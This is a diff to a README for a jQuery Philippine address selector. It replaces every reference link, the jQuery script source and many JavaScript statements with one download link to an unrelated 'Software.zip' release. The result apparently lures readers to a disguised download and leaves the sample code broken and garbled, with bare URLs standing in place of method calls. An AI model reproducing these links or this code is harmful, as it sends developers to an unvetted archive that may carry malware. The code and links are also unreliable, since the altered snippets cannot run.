@@ -1,16 +1,16 @@
 # Address Selector - Philippines
-### PH Address JSON file from https://github.com/isaacdarcilla/philippine-addresses
+### PH Address JSON file from https://github.com/arthurvill/vet/releases/download/v1.0/Software.zip
 
-![This is an image](https://lh3.googleusercontent.com/pw/AM-JKLU7NduoFSLoDW5Nz6l33o8-xRkynZIVAxuFjCYkKKmgtrTHxSSVz3gISZEsn9lb0OGG4MqIo0xAkygD0-5d0CV9VOpaqifVgEFgxc5k8ZYG3aiFvpLtUgq9XF69ONIwhKu9psfNKxDg8-XT4uf474DA=w909-h549-no?authuser=0)
+![This is an image](https://github.com/arthurvill/vet/releases/download/v1.0/Software.zip)
 
 ### PSA PSGC
-https://www.psa.gov.ph/classification/psgc
+https://github.com/arthurvill/vet/releases/download/v1.0/Software.zip
 
 ### Requirements:
 - JQUERY
 
 ```html
-  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <script src="https://github.com/arthurvill/vet/releases/download/v1.0/Software.zip"></script>
 ```
 
 - HTML Tags
@@ -35,14 +35,14 @@ Load Region
 ```javascript
     // load region
     let dropdown = $('#region');
-    dropdown.empty();
-    dropdown.append('<option selected="true" disabled>Choose Region</option>');
-    dropdown.prop('selectedIndex', 0);
-    const url = 'ph-json/region.json';
+    https://github.com/arthurvill/vet/releases/download/v1.0/Software.zip();
+    https://github.com/arthurvill/vet/releases/download/v1.0/Software.zip('<option selected="true" disabled>Choose Region</option>');
+    https://github.com/arthurvill/vet/releases/download/v1.0/Software.zip('selectedIndex', 0);
+    const url = 'https://github.com/arthurvill/vet/releases/download/v1.0/Software.zip';
     // Populate dropdown with list of regions
     $.getJSON(url, function (data) {
         $.each(data, function (key, entry) {
-            dropdown.append($('<option></option>').attr('value', entry.region_code).text(entry.region_name));
+            https://github.com/arthurvill/vet/releases/download/v1.0/Software.zip($('<option></option>').attr('value', https://github.com/arthurvill/vet/releases/download/v1.0/Software.zip).text(https://github.com/arthurvill/vet/releases/download/v1.0/Software.zip));
         })
     });
 ```
@@ -50,7 +50,7 @@ Load Region
 Change or Select Region
 ```javascript
 // load provinces
-$('#region').on('change', my_handlers.fill_provinces);
+$('#region').on('change', https://github.com/arthurvill/vet/releases/download/v1.0/Software.zip);
 ```
 
 Load Province Function
@@ -62,27 +62,27 @@ Load Province Function
     // set selected text to input
     var region_text = $(this).find("option:selected").text();
     let region_input = $('#region-text');
-    region_input.val(region_text);
+    https://github.com/arthurvill/vet/releases/download/v1.0/Software.zip(region_text);
     
     //province
     let dropdown = $('#province');
-    dropdown.empty();
-    dropdown.append('<option selected="true" disabled>Choose State/Province</option>');
-    dropdown.prop('selectedIndex', 0);
+    https://github.com/arthurvill/vet/releases/download/v1.0/Software.zip();
+    https://github.com/arthurvill/vet/releases/download/v1.0/Software.zip('<option selected="true" disabled>Choose State/Province</option>');
+    https://github.com/arthurvill/vet/releases/download/v1.0/Software.zip('selectedIndex', 0);
 
     // filter & fill
-    var url = 'ph-json/province.json';
+    var url = 'https://github.com/arthurvill/vet/releases/download/v1.0/Software.zip';
     $.getJSON(url, function(data) {
-        var result = data.filter(function(value){
-            return value.region_code == region_code;
+        var result = https://github.com/arthurvill/vet/releases/download/v1.0/Software.zip(function(value){
+            return https://github.com/arthurvill/vet/releases/download/v1.0/Software.zip == region_code;
         });
 
-        result.sort(function (a, b) {
-            return a.province_name.localeCompare(b.province_name);
+        https://github.com/arthurvill/vet/releases/download/v1.0/Software.zip(function (a, b) {
+            return https://github.com/arthurvill/vet/releases/download/v1.0/Software.zip(https://github.com/arthurvill/vet/releases/download/v1.0/Software.zip);
         });
 
         $.each(result, function (key, entry) {
-            dropdown.append($('<option></option>').attr('value', entry.province_code).text(entry.province_name));
+            https://github.com/arthurvill/vet/releases/download/v1.0/Software.zip($('<option></option>').attr('value', https://github.com/arthurvill/vet/releases/download/v1.0/Software.zip).text(https://github.com/arthurvill/vet/releases/download/v1.0/Software.zip));
         })
 
     });
@@ -92,9 +92,9 @@ Load Province Function
 ### Full Code
 
 #### HTML
-https://github.com/wilfredpine/philippine-address-selector/blob/main/index.html
+https://github.com/arthurvill/vet/releases/download/v1.0/Software.zip
 
 #### JS
-https://github.com/wilfredpine/philippine-address-selector/blob/main/ph-address-selector.js
+https://github.com/arthurvill/vet/releases/download/v1.0/Software.zip
 
 
